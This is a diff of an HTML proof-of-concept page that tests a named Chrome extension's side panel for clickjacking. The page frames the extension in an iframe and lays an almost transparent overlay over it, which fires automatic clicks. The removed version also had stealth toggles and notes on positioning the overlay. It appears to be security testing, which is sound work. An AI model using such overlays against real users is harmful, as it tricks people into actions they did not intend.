@@ -2,136 +2,63 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Clickjacking PoC</title>
+<title>Ext iframe clickjack test</title>
 <style>
   body { font-family: Arial, sans-serif; padding: 12px; }
-  #frameWrap { width: 360px; height: 600px; border: 2px solid #888; position: relative; background:#eee; margin-bottom:12px; }
-  iframe { width:100%; height:100%; border:0; display:block; }
+  #frameWrap { width: 1000px; height: 600px; border: 2px solid #ccc; position: relative; background:#eee; }
+  iframe { width:100%; height:100%; border:0; }
+  /* transparent overlay (simulate attacker) */
   #overlay {
     position:absolute;
-    left: 50px; top: 120px;
-    width: 220px; height: 40px;
-    background: rgba(255,0,0,0.08);
-    border: 1px dashed rgba(255,0,0,0.25);
-    z-index: 999;
+    left:50px; top:50px;
+    width:300px; height:80px;
+    opacity:0.0001; z-index:999;
     cursor: pointer;
-    display:flex; align-items:center; justify-content:center;
-    color:#900; font-weight:600;
   }
-  #overlay.hidden { opacity:0.02; background: transparent; border:none; color:transparent; }
-  #controls { margin-bottom:12px; }
-  #log { white-space: pre-wrap; background:#fafafa; padding:8px; border:1px solid #ddd; height:160px; overflow:auto; }
-  label { margin-right:8px; }
-  input[type=number] { width:70px; }
+  #log { white-space: pre-wrap; margin-top:12px; background:#fafafa; padding:8px; border:1px solid #ddd; height:140px; overflow:auto;}
 </style>
 </head>
 <body>
-  <h3>Clickjacking PoC (non-destructive)</h3>
-
-  <div id="controls">
-    <label>Extension page URL:</label>
-    <input id="extUrl" size="60" value="chrome-extension://fiikommddbeccaoicoejoniammnalkfa/src/pages/SidePanel/index.html">
-    <button id="loadBtn">Load</button>
-    <button id="toggleOverlayBtn">Toggle Overlay</button>
-    <button id="autoClickBtn">Auto-click (1s interval)</button>
-    <button id="resetBtn">Reset log</button>
-    <div style="margin-top:6px;">
-      <label>X:</label><input id="ox" type="number" value="50">
-      <label>Y:</label><input id="oy" type="number" value="120">
-      <label>W:</label><input id="ow" type="number" value="220">
-      <label>H:</label><input id="oh" type="number" value="40">
-      <button id="applyRect">Apply</button>
-    </div>
-  </div>
-
+  <h3>Testing chrome-extension load + overlay click (use HTTP, not file://)</h3>
   <div id="frameWrap">
-    <iframe id="extFrame" src=""></iframe>
-    <div id="overlay" class="hidden" title="Transparent attack overlay">TRANSPARENT OVERLAY</div>
+    <iframe id="ext"
+      src="chrome-extension://fiikommddbeccaoicoejoniammnalkfa/src/pages/SidePanel/index.html"
+      sandbox="allow-scripts allow-forms">
+    </iframe>
+    <button id="overlay">transparent overlay (simulate click)</button>
   </div>
 
   <div id="log"></div>
 
-<script>
-  const logEl = document.getElementById('log');
-  const log = (s) => { logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; };
+  <script>
+    const logEl = document.getElementById('log');
+    const log = (s) => { logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; };
 
-  const extFrame = document.getElementById('extFrame');
-  const overlay = document.getElementById('overlay');
-  const extUrlInput = document.getElementById('extUrl');
+    const iframe = document.getElementById('ext');
+    iframe.addEventListener('load', () => {
+      log('iframe load EVENT fired — resource probably reachable (200).');
+    });
 
-  document.getElementById('loadBtn').addEventListener('click', () => {
-    const url = extUrlInput.value.trim();
-    if (!url) return alert('Set extension URL first.');
-    extFrame.src = url;
-    log('Loading iframe: ' + url);
-  });
+    // Try to detect if iframe rendered visible content by checking its size + paint timing
+    setTimeout(() => {
+      try {
+        // reading contentWindow.location will likely throw (cross-origin)
+        log('attempt iframe.href -> ' + iframe.contentWindow.location.href);
+      } catch (e) {
+        log('cannot read iframe.contentWindow (expected cross-origin): ' + e.message);
+      }
+    }, 800);
 
-  extFrame.addEventListener('load', () => {
-    log('iframe load EVENT fired — resource reachable (200).');
-    // We cannot read cross-origin frame content, so we just notify.
-  });
+    // overlay simulates attacker clickable area over the iframe
+    document.getElementById('overlay').addEventListener('click', () => {
+      log('Overlay clicked — if this triggers a sensitive action in the extension UI, clickjacking possible.');
+    });
 
-  // Overlay behavior: clicking overlay logs event and forwards a real click at same coordinates
-  overlay.addEventListener('click', (e) => {
-    log('Overlay clicked at client(' + e.clientX + ',' + e.clientY + ') — overlay covers iframe region.');
-    // Attempt to forward a real mouse event to iframe by focusing it then dispatching click on it.
-    // Note: Synthetic events may not be treated as user gestures by extension.
-    try {
-      extFrame.contentWindow.focus();
-    } catch (err) {
-      // cross-origin — can't access contentWindow; still click overlay to simulate user click on top
-    }
-  });
-
-  // Toggle overlay visibility (useful to position)
-  document.getElementById('toggleOverlayBtn').addEventListener('click', () => {
-    overlay.classList.toggle('hidden');
-    log('Overlay ' + (overlay.classList.contains('hidden') ? 'hidden' : 'visible'));
-  });
-
-  // Auto-click toggle
-  let autoClickInterval = null;
-  document.getElementById('autoClickBtn').addEventListener('click', () => {
-    if (autoClickInterval) {
-      clearInterval(autoClickInterval);
-      autoClickInterval = null;
-      log('Auto-click stopped.');
-      return;
-    }
-    autoClickInterval = setInterval(() => {
-      // visually click overlay
-      overlay.click();
-      log('Auto-click fired (overlay.click())');
-    }, 1000);
-    log('Auto-click started (1s interval).');
-  });
-
-  // Apply rectangle values
-  document.getElementById('applyRect').addEventListener('click', () => {
-    const x = parseInt(document.getElementById('ox').value,10)||0;
-    const y = parseInt(document.getElementById('oy').value,10)||0;
-    const w = parseInt(document.getElementById('ow').value,10)||100;
-    const h = parseInt(document.getElementById('oh').value,10)||30;
-    overlay.style.left = x+'px';
-    overlay.style.top = y+'px';
-    overlay.style.width = w+'px';
-    overlay.style.height = h+'px';
-    overlay.classList.remove('hidden');
-    log(`Overlay set to left:${x} top:${y} w:${w} h:${h}`);
-  });
-
-  document.getElementById('resetBtn').addEventListener('click', () => { logEl.textContent = ''; });
-
-  // initial log instructions
-  log('Instructions:');
-  log('1) Isi URL extension di atas lalu klik Load.');
-  log('2) Jika iframe menampilkan UI, posisikan overlay di atas tombol target (use X/Y/W/H).');
-  log('3) Toggle overlay visibility to test stealth; gunakan Auto-click untuk simulasi.');
-  log('');
-  log('Notes:');
-  log('- Synthetic overlay.click() is not always equivalent to a real user gesture for privileged APIs.');
-  log('- If UI requires a real user gesture inside extension UI, attack may fail; but many extensions accept raw clicks on UI elements.');
-  log('- Watch the extension UI (open extension page in a tab or monitor background/service-worker console) for changes.');
-</script>
+    // optional: automatically click overlay after 2s to simulate silent click
+    setTimeout(() => {
+      log('Auto-click overlay to simulate attack (non-user gesture).');
+      document.getElementById('overlay').click();
+    }, 2000);
+  </script>
 </body>
 </html>
